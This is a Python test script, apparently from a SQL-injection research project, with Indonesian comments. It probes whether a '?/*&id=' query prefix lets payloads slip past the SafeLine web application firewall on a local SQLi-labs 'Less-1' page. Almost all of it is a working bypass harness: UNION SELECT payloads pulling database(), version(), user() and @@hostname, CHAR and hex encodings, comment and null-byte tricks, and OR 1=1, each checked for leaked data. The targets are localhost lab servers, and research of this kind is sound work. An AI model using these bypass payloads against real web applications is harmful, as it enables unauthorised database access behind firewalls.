"""
bypass_lab/test_path_comment.py
================================
URL pattern: http://host/Less-1/?/*&id=<payload>

?/* di query string mungkin buat Safeline parser masuk "comment mode"
sebelum sampai ke id param — Safeline blind ke seluruh id value.

Kalau ini benar, function call seperti database() mungkin lolos!

Run:
    python3 -m bypass_lab.test_path_comment
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

BASE_PLAIN  = "http://localhost:8081/Less-1/"
BASE_WAF    = "http://localhost:8888/Less-1/"

# Prefix trick: ?/*&id= bukan ?id=
PREFIX_PLAIN = "http://localhost:8081/Less-1/?/*&id="
PREFIX_WAF   = "http://localhost:8888/Less-1/?/*&id="

FOUND = []


def req(url_with_payload):
    try:
        r = requests.get(url_with_payload, timeout=8)
        idx = r.text.find("Your Login name:")
        val = r.text[idx+16:idx+60].split("<")[0].strip() if idx >= 0 else ""
        return r.status_code, val
    except:
        return 0, ""


def t(label, payload, compare_normal=True):
    # Test dengan prefix biasa
    if compare_normal:
        s_n, v_n = req(BASE_WAF + "?id=" + requests.utils.quote(payload))
        tag_n = "BLOCK" if s_n == 403 else ("DATA" if v_n else "PASS")
    else:
        tag_n, v_n = "skip", ""

    # Test dengan prefix /*
    s_p, v_p = req(PREFIX_WAF + requests.utils.quote(payload))
    tag_p = "BLOCK" if s_p == 403 else ("DATA!" if v_p else "PASS")

    # Plain backend untuk verifikasi SQL
    s_pl, v_pl = req(PREFIX_PLAIN + requests.utils.quote(payload))
    plain_ok = bool(v_pl)

    print(f"  normal={tag_n:<8} ?/*={tag_p:<10} plain={plain_ok} | {label}")
    if v_p:
        print(f"    WAF returned: {repr(v_p[:40])}")
        FOUND.append((label, payload, v_p))
    elif v_pl and tag_p != "BLOCK":
        print(f"    plain={repr(v_pl[:30])}")
    time.sleep(0.3)


print("=" * 70)
print(" Test: ?/*&id= prefix + berbagai payload")
print("=" * 70)

# ── 1. Baseline: konfirmasi ?/* masih bypass ──────────────────────────
print("\n[1] Baseline — numeric bypass dengan ?/* prefix")
t("numeric baseline",
  ".1-- -'/0 UNION ALL SELECT 1,99999,88888'")

# ── 2. Function calls dengan ?/* prefix (before: all BLOCK) ──────────
print("\n[2] Function calls dengan ?/* prefix")
t("database()",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2'")
t("SCHEMA()",
  ".1-- -'/0 UNION ALL SELECT 1,SCHEMA(),2'")
t("version()",
  ".1-- -'/0 UNION ALL SELECT 1,version(),2'")
t("user()",
  ".1-- -'/0 UNION ALL SELECT 1,user(),2'")
t("@@version",
  ".1-- -'/0 UNION ALL SELECT 1,@@version,2'")
t("@@hostname",
  ".1-- -'/0 UNION ALL SELECT 1,@@hostname,2'")

# ── 3. CHAR markers dengan ?/* prefix ────────────────────────────────
print("\n[3] CHAR markers dengan ?/* prefix")
t("CHAR markers",
  ".1-- -'/0 UNION ALL SELECT 1,CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84),CHAR(83,69,81,83,81,76,73,95,69,78,68)'")
t("CHAR + database()",
  ".1-- -'/0 UNION ALL SELECT database(),CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84),CHAR(83,69,81,83,81,76,73,95,69,78,68)'")

# ── 4. hex markers dengan ?/* prefix ─────────────────────────────────
print("\n[4] Hex markers dengan ?/* prefix")
t("hex markers",
  ".1-- -'/0 UNION ALL SELECT 1,0x534551534c495f5354415254,0x534551534c495f454e44'")
t("hex + database()",
  ".1-- -'/0 UNION ALL SELECT database(),0x534551534c495f5354415254,0x534551534c495f454e44'")

# ── 5. Kombinasi ?/* dengan berbagai ending ───────────────────────────
print("\n[5] ?/* + database() dengan berbagai ending")
t("db + -- -",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2-- -")
t("db + #",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2#")
t("db + quote",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2'")
t("db + null byte",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2';\x00")

# ── 6. Double comment: ?/* + /* dalam payload ─────────────────────────
print("\n[6] ?/* + /* dalam UNION (double comment trick)")
t("double /* comment",
  ".1-- -'/**/0 UNION ALL SELECT 1,database(),2'")
t("?/* + payload comment",
  ".1/**/-- -'/0 UNION ALL SELECT 1,database(),2'")

# ── 7. ?/* dengan payload yang berbeda total ─────────────────────────
print("\n[7] Payload yang lebih agresif via ?/* prefix")
t("standard UNION direct",
  "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -")
t("basic sqli",
  "1' AND '1'='1")
t("boolean true",
  "1' OR 1=1-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 70)
print(f" GOT DATA via ?/* prefix: {len(FOUND)}")
for label, p, val in FOUND:
    print(f"\n  {label}")
    print(f"  WAF returned: {repr(val)}")
    print(f"  payload: {p[:90]}")
